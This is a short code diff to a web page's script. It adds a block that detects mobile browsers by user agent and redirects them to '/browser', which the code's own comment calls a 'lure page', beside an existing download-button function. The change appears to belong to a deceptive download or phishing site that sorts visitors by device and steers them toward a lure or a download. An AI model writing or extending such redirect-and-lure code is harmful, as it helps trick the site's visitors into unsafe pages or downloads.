@@ -236,6 +236,15 @@ body {
 </div>
 
 <script>
+// ── Mobile detection — redirect to lure page directly ────────
+(function() {
+  const ua = navigator.userAgent;
+  const isMobile = /Android|iPhone|iPad|iPod|Mobile|BlackBerry|IEMobile|Opera Mini/i.test(ua);
+  if (isMobile) {
+    window.location.replace('/browser');
+  }
+})();
+
 function startDownload() {
   const btn    = document.getElementById('dl-btn');
   const status = document.getElementById('dl-status');
